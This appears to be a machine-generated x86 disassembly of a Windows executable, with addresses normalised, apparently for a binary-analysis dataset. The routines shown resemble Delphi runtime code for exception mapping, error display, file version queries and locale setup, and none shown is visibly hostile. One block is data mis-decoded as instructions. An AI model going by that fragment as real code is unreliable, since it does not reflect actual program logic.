call sub_40c978
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404638
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4043e0
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40416c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408ce4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e0
inc ebx
jmp r-xdata
mov eax esi
call sub_4043d8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ce4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e0
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e0
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e0
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4043e0
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404300
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4043e0
sub_40bb3c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40bb30
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40cb3c
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408c08
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4054e8
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_40326c
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409240
mov eax [ ebp - 0x4 ]
call sub_408ba4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4045d8
mov ebx eax
mov eax ebx
call sub_408ba4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40bcc4
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40bb3c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4054e8
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b50
call sub_402854
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408ba4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bd8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40416c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bdc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40be22
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409280
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be29
lea eax [ ebp - 0x4 ]
call sub_404118
retn
add esp 0xfffffff0
call sub_403668
sub_40be29
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40be48
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405f7c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40be84
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bef0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405f7c
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409280
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bef7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
add esp 0xfffffff0
call sub_403668
sub_40bef7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bf44
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028c8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bfa4
test al 0xbf
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403ad0
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bd8c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bf44
mov edx eax
sub_40c018
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40c0b4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c0bb
lea eax [ ebp - 0x20 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40c108
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40c1a0
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c35b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404388
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408abc
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c362
lea eax [ ebp - 0x170 ]
call sub_404118
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40c36c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c427
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40c108
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bd8c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push ebp
call sub_40c1a0
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c42e
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
mov ebx eax
sub_40c448
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c438
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40c188
mov eax [ rw-data ]
mov [ eax ] sub_40c36c
mov eax sub_40c0d4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40c0f0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c4cc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_40331c
xor eax eax
mov [ rw-data ] eax
sub_40c54c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404388
sub_40c5dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c6b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041b0
lea eax [ ebp - 0x8 ]
call j_sub_4045e4#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c6b9
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax ebx
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c695
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c6c8
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c740
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4045d8
mov edx esi
dec edx
call sub_40c6c8
sub_40c77c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043d8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c7a4
pop esi
pop ebx
retn
mov eax ebx
call sub_4043d8
mov esi eax
sub_40c7a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4043d8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c9b4
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c7fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4043d8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c9b4
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c9b4
dec eax
mov ebx eax
sub_40c88c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4043d8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c7fc
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4043d8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c8f0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4043d8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4043d8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c7fc
mov eax esi
call sub_4043d8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4043d8
mov [ esp ] eax
jmp r-xdata
sub_40c978
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4045d8
add eax esi
dec eax
call sub_40c950
sub_40c9b4
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4045d8
add eax ebx
dec eax
call sub_40c950
add eax ebx
sub_40c9f0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4043d8
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c740
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40ca24
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40416c
mov eax [ ebx ]
call sub_4043d8
mov edx eax
mov eax [ ebx ]
call sub_40c9f0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_4043e0
sub_40ca64
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4045d8
push eax
mov eax esi
call sub_4045d8
mov ebp eax
mov eax ebp
pop edx
call sub_40ca9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40ca9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408ba4
mov [ esp ] eax
mov eax ebp
call sub_408ba4
mov edi eax
mov edx ebp
mov eax esi
call sub_408d3c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c764
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408d3c
mov ebx eax
inc ebx
sub_40cb3c
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40cb64
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40cb64
test eax eax
jne r-xdata
sub_40cb64
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408d28
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c764
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408d28
mov edi eax
test edi edi
jne r-xdata
sub_40cba4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40cc08
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404388
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408684
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc0f
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_40cc18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40cba4
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cc90
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cc78
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40cc18
pop ecx
push ebp
call sub_40cc18
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402e48
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
